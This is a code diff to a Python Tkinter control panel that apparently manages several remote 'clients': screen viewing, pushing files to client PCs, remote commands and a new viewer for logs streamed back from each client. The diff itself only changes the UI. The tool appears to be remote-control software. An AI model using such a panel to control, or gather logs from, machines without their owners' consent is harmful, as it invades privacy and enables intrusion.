@@ -148,6 +148,7 @@ class ScreenSharingServer:
         self.client_infos = [{}] * 5
         self.current_info_index = 0
         self.screwIt_weBall = False
+        self.logIndex = 0
         # UI elements
         self.canvas = objTK.Canvas(master, bg="black")
         self.canvas.pack(fill=objTK.BOTH, expand=True)
@@ -161,7 +162,11 @@ class ScreenSharingServer:
             master, text="Next", command=self.next_client, width=20
         )
         self.next_button.pack(padx=5, pady=5, side=objTK.RIGHT)
-
+        # Logger Button
+        self.loggerButton = objTTK.Button(
+            loggerFrame, text="Switch Client", command=self.log_scroll
+        )
+        self.loggerButton.place(rely=-0.15, relx=0.8, relwidth=0.19, relheight=1.1)
         # General Commands tab
         self.flashbangLabel = objTTK.Label(
             objSettingsTab5, text="FLASHBANG! the client!", font=normalFont
@@ -333,7 +338,13 @@ class ScreenSharingServer:
                         logSize = logSize * 10 + int(receivedCharaLog)
                     logRecv = client_socket.recv(logSize).decode("utf-8")
                     self.logsClient[index] += logRecv
-                    print(self.logsClient)
+                    loggerOutput.config(state="normal")
+                    loggerOutput.delete(1.0, objTK.END)
+                    loggerOutput.insert(
+                        objTK.END,
+                        f"! Client {self.logIndex + 1}\n{self.logsClient[self.logIndex]}",
+                    )
+                    loggerOutput.config(state="disabled")
             except UnicodeDecodeError:
                 pass
         except (ConnectionError, OSError) as e:
@@ -540,6 +551,19 @@ class ScreenSharingServer:
         finally:
             root.deiconify()
 
+    def log_scroll(self):
+        self.logIndex += 1
+        if self.logIndex >= len(self.client_sockets):
+            self.logIndex = 0
+        loggerOutput.config(state="normal")
+        loggerOutput.delete(1.0, objTK.END)
+        loggerOutput.insert(
+            objTK.END,
+            f"! Changed to Client {self.logIndex + 1}\n{self.logsClient[self.logIndex]}",
+        )
+        loggerOutput.config(state="disabled")
+        loggerOutput.yview_moveto(1.0)
+
 
 # This makes the UI more CRISP!
 try:
@@ -580,6 +604,8 @@ def toggle_theme():
 sv_ttk.set_theme("dark")
 style = objTTK.Style()
 # Some "MAGICAL CRAP" with the button and tab styles
+style.configure("TLabelframe", borderwidth=2, relief="solid", labelmargins=20)
+style.configure("TLabelframe.Label", font=normalFont)
 style.configure("TButton", font=lightFont)
 style.map("TButton", font=[("disabled", ("Montserrat", 10, "bold"))])
 style.layout(
@@ -619,6 +645,27 @@ tabControl.add(objSettingsTab2, text="Screen View")
 tabControl.add(objSettingsTab3, text="File Uploader")
 tabControl.add(objSettingsTab4, text="File Downloader")
 tabControl.add(objSettingsTab5, text="General Commands")
+# Frame
+loggerFrame = objTTK.LabelFrame(
+    objHomeTab,
+    text="Logs from Clients",
+    borderwidth=5,
+    relief="solid",
+    height=220,
+    width=850,
+)
+loggerFrame.place(x=20, y=310)
+loggerOutput = objTK.Text(
+    loggerFrame,
+    font=terminalFont,
+    fg="#fff",
+    state="disabled",
+    highlightthickness=0,
+    borderwidth=0,
+    padx=15,
+    pady=15,
+)
+loggerOutput.place(rely=-0.15, relwidth=0.8, relheight=1.10)
 # Initialize the classes
 server = ScreenSharingServer(objSettingsTab2)
 terminal = CustomCommandPrompt(objSettingsTab1)
@@ -641,35 +688,33 @@ def fileUploader():
         fileSizeLabel.config(text=f"File Size: {len(file_data)} bytes")
 
 
-fileLabel = objTTK.Label(objSettingsTab3, text="Select File:", font=normalFont)
-fileLabel.place(x=20, y=20)
-uploadFrame = objTTK.Frame(
+uploadFrame = objTTK.LabelFrame(
     objSettingsTab3,
-    border=0,
-    padding=2,
-    height=45,
+    text="Select File:",
+    borderwidth=5,
+    relief="solid",
+    height=130,
     width=660,
-    style="UploadFrame.TFrame",
 )
-uploadFrame.place(x=30, y=50)
+uploadFrame.place(x=20, y=20)
 uploadButton = objTTK.Button(uploadFrame, text="Upload", command=fileUploader)
-uploadButton.place(relx=0, rely=0, relheight=1, relwidth=0.15)
+uploadButton.place(relx=0.025, rely=-0.25, relheight=1, relwidth=0.25)
 fileNameLabel = objTTK.Label(uploadFrame, text="No File Selected", font=normalFont)
-fileNameLabel.place(relx=0.16, rely=-0.1, relheight=0.6)
+fileNameLabel.place(relx=0.3, rely=-0.25, relheight=0.5)
 fileSizeLabel = objTTK.Label(uploadFrame, text="No File Selected", font=normalFont)
-fileSizeLabel.place(relx=0.16, rely=0.5, relheight=0.6)
+fileSizeLabel.place(relx=0.3, rely=0.27, relheight=0.5)
 fileEntryLabel = objTTK.Label(
     objSettingsTab3,
     text="Enter Destination Location, (Location on Client PC):",
     font=normalFont,
 )
-fileEntryLabel.place(x=20, y=100)
+fileEntryLabel.place(x=20, y=160)
 locationClientEntry = objTTK.Entry(objSettingsTab3, font=smallFont, width=80)
-locationClientEntry.place(x=30, y=130)
+locationClientEntry.place(x=30, y=190)
 clientChosenLabel = objTTK.Label(
     objSettingsTab3, text="Choose a Client: ", font=normalFont
 )
-clientChosenLabel.place(x=20, y=180)
+clientChosenLabel.place(x=20, y=240)
 clientChosen = objTTK.Spinbox(
     objSettingsTab3,
     from_=1,
@@ -677,7 +722,7 @@ clientChosen = objTTK.Spinbox(
     exportselection=True,
     font=smallFont,
 )
-clientChosen.place(x=160, y=180)
+clientChosen.place(x=160, y=240)
 
 
 def sendFunction():
@@ -707,7 +752,7 @@ def sendFunction():
 
 
 fileSendButton = objTTK.Button(objSettingsTab3, text="Send em!", command=sendFunction)
-fileSendButton.place(x=20, y=230)
+fileSendButton.place(x=20, y=290)
 
 
 # Some tweaks to make the theme toggle a lil nicer
@@ -719,22 +764,12 @@ def apply_focus_style():
         terminal.frame.config(bg="#252525")
         terminal.output_text.config(bg="#252525")
         terminal.output_text.config(fg="#efefef")
-        fileNameLabel.config(foreground="#efefef")
-        fileNameLabel.config(background="#252525")
-        fileSizeLabel.config(foreground="#efefef")
-        fileSizeLabel.config(background="#252525")
-        style.configure("UploadFrame.TFrame", background="#252525")
     else:
         focus_bg = "#FFFFFF"
         server.canvas.config(bg="#FFFFFF")
         terminal.frame.config(bg="#F5F5F5")
         terminal.output_text.config(bg="#F5F5F5")
         terminal.output_text.config(fg="#333333")
-        fileNameLabel.config(foreground="#333333")
-        fileNameLabel.config(background="#F5F5F5")
-        fileSizeLabel.config(foreground="#333333")
-        fileSizeLabel.config(background="#F5F5F5")
-        style.configure("UploadFrame.TFrame", background="#F5F5F5")
 
     style.map("TNotebook.Tab", focuscolor=[("!focus", focus_bg), ("focus", focus_bg)])
     style.configure("TNotebook.Tab", font=lightFont)
